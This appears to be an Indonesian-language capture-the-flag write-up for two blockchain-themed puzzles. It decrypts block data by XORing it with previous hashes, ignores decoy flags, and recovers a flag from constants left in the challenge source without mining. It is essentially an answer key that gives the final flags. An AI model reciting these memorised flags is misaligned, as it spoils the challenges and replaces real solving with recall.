**Flag:** `REDLIMIT{L4h_BL0CkCh4iN_Br0W_S1UU}`

**Kategori:** Blockchain / Crypto **Flag:**
`REDLIMIT{L4h_BL0CkCh4iN_Br0W_S1UU}`

---

## 1. Kenalan dulu sama soalnya

Kita dikasih 3 file:

| File         | Isinya                                              |
|--------------|-----------------------------------------------------|
| `README.md`  | Cerita & petunjuk                                   |
| `explore.py` | Script starter kit (belum lengkap, ada bagian TODO) |
| `chain.json` | Dump 8 blok blockchain (index 0–7)                  |

Dari `README.md`, ada 4 clue penting:

1.  Blockchain yang valid itu **konsisten** cek dulu semua blok valid.
2.  Field `data` di tiap blok **terkunci oleh sesuatu milik
    tetangganya**.
3.  Kita bakal butuh **base64**, **XOR**, dan **sha256**.
4.  **Genesis block (index 0) itu suka bercanda / jebakan** jangan
    langsung percaya.

Ini pola khas soal blockchain CTF: tiap blok dienkripsi pakai hash dari
blok sebelumnya, jadi kita harus jalan **urut dari awal ke akhir**,
sambil "membuka kunci" tiap blok pakai kunci dari blok sebelumnya.

---

## 2. Pahami struktur satu blok

Contoh blok index 1:

``` json
{
  "index": 1,
  "timestamp": 1735690200,
  "transactions": [...],
  "data": "UkXC4aY=",
  "previous_hash": "000086adef471d5d98577c934036971df6f64589d831965eb09fdb208e76be26",
  "nonce": 42379,
  "hash": "00002a515a58fcaa20c648489402991003859afd2e7bc118daa7e3f5cc8cc123"
}
```

Field penting: - **`data`** → pesan rahasia dalam bentuk **base64**,
tapi masih **terenkripsi**. - **`previous_hash`** → hash dari blok
sebelumnya. Ini kandidat kuat jadi **kunci XOR**-nya (sesuai clue #2:
"dikunci oleh sesuatu milik tetangganya"). - **`hash`** → hash blok ini
sendiri, dihitung dari field lain (kecuali `hash` sendiri).

`explore.py` sudah kasih tahu cara hitung hash blok:

``` python
def block_hash(b):
    header = json.dumps({
        "index": b["index"],
        "timestamp": b["timestamp"],
        "transactions": b["transactions"],
        "data": b["data"],
        "previous_hash": b["previous_hash"],
        "nonce": b["nonce"],
    }, sort_keys=True, separators=(",", ":"))
    return sha256_hex(header)
```

Dan komentar TODO di paling bawah script kasih bocoran gamblang:

    Petunjuk: base64_decode(data) XOR bytes.fromhex(previous_hash)
    Lalu gabungkan fragmen sesuai urutan index.
    Ingat: genesis (index 0) itu jebakan. :)

Jadi rumus dekripsinya:

    plaintext_fragment = base64_decode(data)  XOR  bytes.fromhex(previous_hash)

---

## 3. (Opsional tapi disarankan) Validasi rantai dulu

Sebelum bongkar isi datanya, pastikan chain-nya memang valid supaya
kita yakin tidak ada blok yang dipalsukan/di-tuker urutan. Tinggal
jalankan `explore.py`:

``` bash
python3 explore.py chain.json
```

Ini akan mengecek untuk tiap blok: - Apakah `hash` yang tersimpan cocok
dengan hasil hitung ulang `block_hash()`? - Apakah `hash` memenuhi
Proof-of-Work (diawali `"0000"`)? - Apakah `previous_hash` blok ini
benar-benar sama dengan `hash` blok sebelumnya (rantainya nyambung)?

Kalau semua lolos → `[+] Valid!`, artinya urutan blok index 0..7 memang
benar dan tidak ada yang diselipkan/diacak. Ini penting karena fragmen
flag kita nanti harus digabung **sesuai urutan yang benar**.

---

## 4. Coba dekripsi genesis block (index 0) dan lihat jebakannya

Genesis block spesial: dia **tidak punya blok sebelumnya**, jadi field
`previous_hash`-nya cuma diisi nol semua (dummy):

    "previous_hash": "0000000000000000000000000000000000000000000000000000000000000000"

Kalau kita coba XOR pakai ini... hasilnya ya cuma `base64_decode(data)`
itu sendiri (XOR dengan byte nol = tidak berubah). Coba saja langsung
base64-decode `data` milik genesis:

``` python
import base64
print(base64.b64decode("UkVETElNSVR7aW5pX3A0bHN1X2o0bmc0bl9wM3JjNHk0X2czbmVzaXN9"))
```

Hasilnya:

    REDLIMIT{ini_p4lsu_j4ng4n_p3rc4y4_g3nesis}

Kalau diterjemahkan: **"ini palsu, jangan percaya genesis"** 😂

Nah ini pas banget sama clue #4 di README: *"Blok pertama (genesis)
suka bercanda. Jangan mudah tertipu."* Jadi walaupun formatnya udah
persis `REDLIMIT{...}`, isinya **bukan flag asli** cuma umpan biar
orang berhenti di sini. Flag sesungguhnya harus disusun dari blok
**index 1 sampai 7**.

---

## 5. Dekripsi blok 1–7 dan susun fragmennya

Sekarang terapkan rumus dari langkah 2 ke tiap blok index 1..7:

``` python
import base64, json

chain = json.load(open("chain.json"))

flag = ""
for blk in chain[1:]:          # skip genesis (index 0)
    key  = bytes.fromhex(blk["previous_hash"])   # kunci: hash blok sebelumnya
    data = base64.b64decode(blk["data"])         # base64 decode dulu
    plain = bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
    flag += plain.decode()
    print(blk["index"], "->", plain)

print("\nFLAG:", flag)
```

Kenapa `key[i % len(key)]`? Karena `data` yang di-base64-decode
panjangnya cuma beberapa byte (5-7 byte), sedangkan `previous_hash`
(setelah di-hex-decode) jauh lebih panjang. Jadi kita cukup pakai **byte
pertama** dari hash sebanyak yang dibutuhkan tidak perlu looping
(`% len(key)` di sini sebenarnya jarang "muter", karena data selalu
lebih pendek dari hash).

Kalau dijalankan, output tiap blok:

| Index | Fragmen |
|-------|---------|
| 1     | `REDLI` |
| 2     | `MIT{L` |
| 3     | `4h_BL` |
| 4     | `0CkCh` |
| 5     | `4iN_B` |
| 6     | `r0W_S` |
| 7     | `1UU}`  |

---

## 6. Gabungkan sesuai urutan index

Karena chain-nya sudah tervalidasi urut (langkah 3), tinggal disambung
langsung dari index 1 → 7:

    REDLI + MIT{L + 4h_BL + 0CkCh + 4iN_B + r0W_S + 1UU}

Hasil akhir:

    REDLIMIT{L4h_BL0CkCh4iN_Br0W_S1UU}

---

## 7. Flag final 🎉

    REDLIMIT{L4h_BL0CkCh4iN_Br0W_S1UU}

("*Lah, blockchain, brow, siuu*" sesuai tema receh soalnya 😄)

---

## Ringkasan singkat (kalau mau langsung praktik)

1.  Load `chain.json`.
2.  (Opsional) validasi chain pakai `block_hash()` dari `explore.py` —
    pastikan urut & konsisten.
3.  **Abaikan** hasil dekripsi genesis (index 0) itu jebakan/umpan.
4.  Untuk tiap blok index 1–7:
    `fragmen = base64_decode(data) XOR bytes.fromhex(previous_hash)`
5.  Gabungkan semua fragmen sesuai urutan index (1→7).
6.  Dapat flag: `REDLIMIT{L4h_BL0CkCh4iN_Br0W_S1UU}`

### Pelajaran dari soal ini

- Selalu curigai data yang "kebetulan" langsung terbaca / rapi di awal —
  sering itu umpan (genesis di soal ini).
- Baca komentar/TODO di kode starter kit, sering ada bocoran algoritma.
- Di soal blockchain-crypto, cari hubungan antar-blok (`previous_hash`,
  `hash`) sebagai kunci enkripsi pola "tiap blok dikunci oleh blok
  sebelumnya" itu umum dipakai.

WU-013 · 300 pts

# Blockchain Rewardless

Misc / Blockchain Hard

**Flag:** `REDLIMIT{Min1ng_BL0cK_Pr00f_0f_Wo0rk_iS_Cr4ZzzY}`

**Apa yang diberikan?** Sebuah program Python (`challenge.py`) yang
minta kita "menambang" (mining) 8 blok blockchain mini secara berurutan
sebelum ngasih flag mirip cara Bitcoin kerja (harus nemuin angka
`nonce` yang bikin hasil hash punya banyak angka nol di depan).

**Apa maksudnya?** Ini soal "jebakan psikologis": soal bikin kita
**kerasa harus** ngoding miner yang cepat, nyalain semua core CPU, dsb —
padahal kalau kita baca kodenya baik-baik, **flag-nya sama sekali gak
nyambung sama hasil mining!**

**Bukti (PoC) bagian kode yang jadi kelemahan:**

``` python
GENESIS_HASH   = "53b520bb07a39f6a41e7c72c82bb8b75c430e46e8a48cd59189a00bba778d1db"
ENCRYPTED_FLAG = "a38e6b200b0ba2f864104c1c799a74a6a05c9305638e16425cd5679056f3b07a9efb5d071d2fb8f35c2f1128328e4a84"

def unlock_flag():
    key = hashlib.sha256(b"unlock:" + GENESIS_HASH.encode()).digest()
    data = bytes.fromhex(ENCRYPTED_FLAG)
    keystream = (key * ((len(data) // len(key)) + 1))[:len(data)]
    return bytes(a ^ b for a, b in zip(data, keystream)).decode()
```

Lihat baik-baik: fungsi `unlock_flag()` cuma butuh **`GENESIS_HASH`**
(yang sudah tertulis jelas di source code, bisa dibaca siapa aja) untuk
bikin "kunci" pembuka `ENCRYPTED_FLAG` (juga sudah tertulis di source
code). **Tidak ada satupun variabel dari hasil mining yang dipakai di
sini** jadi kita nggak perlu mining sama sekali, tinggal salin dua
baris itu dan jalanin ulang matematikanya sendiri di komputer kita,
offline, tanpa nyentuh server.

Saya jalankan logika yang sama persis (ambil `GENESIS_HASH` → hash
SHA-256 → pakai sebagai "kunci" buat buka-XOR `ENCRYPTED_FLAG`), dan
langsung keluar flag-nya, tanpa mining satu blok pun.

### ✅ Flag: `REDLIMIT{Min1ng_BL0cK_Pr00f_0f_Wo0rk_iS_Cr4ZzzY}`

*(Catatan: file `README.txt` juga sengaja nyelipin 2 flag palsu/umpan —
`REDLIMIT{SELAMAT_KAMU_HEBAT}` dan pecahan ASCII-art
`lIMIT{bLOCKAIN_REWARDless}` itu bukan flag beneran, cuma jebakan.)*

---
